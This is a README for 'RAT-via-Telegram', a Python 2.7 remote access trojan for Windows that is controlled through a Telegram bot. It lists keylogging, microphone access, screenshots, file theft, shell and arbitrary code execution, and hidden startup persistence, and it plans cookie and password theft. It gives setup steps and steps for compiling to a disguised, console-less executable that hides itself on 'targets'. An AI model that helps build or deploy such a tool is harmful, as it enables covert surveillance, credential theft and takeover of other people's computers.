# RAT-via-Telegram

Windows Remote Administration Tool via Telegram (Python 2.7) | Originally created by <a href="http://github.com/Ritiek">Ritiek</a>

### Why another one?

- The current Remote Administration Tools in the market face 2 major problems:

    - Lack of encryption.
    - Require port forwarding in order to control from hundreds of miles.

- This RAT overcomes both these issues by using the Telegram bot API.

    - Fully encrypted. The data being exchanged cannot be spied upon using MITM tools.
    - Telegram messenger app provides a simple way to communicate to the target without configuring port forward before hand on the target.

## Features:

- Keylogger with window title log included
- Get target PC's Windows version, processor and more
- Get target PC's IP address information and approximate location on map
- Delete, Move files
- Show current directory 
- Change current directory 
- List current or specified directory 
- Download any file from the target
- Upload local files to the target. Send your image, pdf, exe or anything as `file` to the Telegram bot
- Autostart playing a video in fullscreen and no controls for a youtube video on target
- Take Screenshots
- Execute any file
- Access to microphone 
- Start HTTP Proxy Server
- Freeze target's keyboard
- Schedule tasks to run at specified datetime
- Encode/Decode all local files
- Ping targets
- Update .exe -- thanks <a href="http://github.com/LearnerZone">LearnerZone</a>
- Self-Destruct RAT
- Change wallpaper from file or url
- Execute arbitrary python 2.7 on the go
- Execute cmd shell
- [TODO] Browser (IE, Firefox, ~~Chrome~~) cookies retrieval
- [TODO] Password retrieval
- [TODO] Monitor web traffic (graphically?)
- [TODO] Fine-tuning scripting (i.e.: if app x is opened y is executed)
- [TODO] Freeze target's mouse
- [TODO] Capture clipboard (Text, Image)
- [TODO] Hide desktop icons
- [TODO] Take snapshots from the webcam (if attached)
- [TODO] Audio compression

## Installation & Usage:

- Clone this repository.
- Set up a new Telegram bot talking to the `BotFather`.
- Copy this token and replace it in the beginning of the script.
- Install the dependencies: `pip install -r requirements.txt`.
- Install pyHook `64-bit` or `32-bit` depending on your system.
    - For 64-bit- `pip install pyHook-1.5.1-cp27-cp27m-win_amd64.whl`.
    - For 32-bit- `pip install pyHook-1.5.1-cp27-cp27m-win32.whl`.
- To run the script: `python RATAttack.py`.
- Find your bot on telegram and send some command to the bot to test it.
- To restrict the bot so that it responds only to you, note down your `chat_id` from the console and replace it in the script and comment out the line `return True`. Don't worry, you'll know when you read the comments in the script.

- A folder named `RATAttack` will be created in your working directory containing `keylogs.txt` and any files you upload to the bot.

```

You can copy the above to update your command list via `BotFather` so you don't have to type them manually.

## Compiling:

### How To Compile:
#### Either:
	Replace your path in compileAndRun.bat (running this will actually run the executable)
#### Or:
	Run `pyinstaller --onefile --noconsole C:\path\to\RATAttack.py`. You can also pass `--icon=<path\to\icon.ico>` to use any custom icon.
- Once it is compiled successfully, find the `.exe` file in `C:\Python27\Scripts\dist\`. You can change the name of the `.exe` to anything you wish.
- **BEWARE!** If you run the compiled `.exe`, the script will hide itself and infect your PC to run at startup. You can return to normal by using the `/self_destruct` option or manually removing `C:\Users\Username\AppData\Roaming\Portal` directory and `C:\Users\Username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\portal.lnk` (although I recommend removing them manually for the time being).

### Modifying Settings:

- You can also modify the name of hidden `.exe` file and location & name of the folder where the hidden `.exe` will hide itself. To do this; modify `compiled_name` and `hide_folder` respectively.
- Assign your known chat ids to beginning of RATAttack.py

## Notes:

- Currently only Python2 is supported. Python3 support will be added soon!
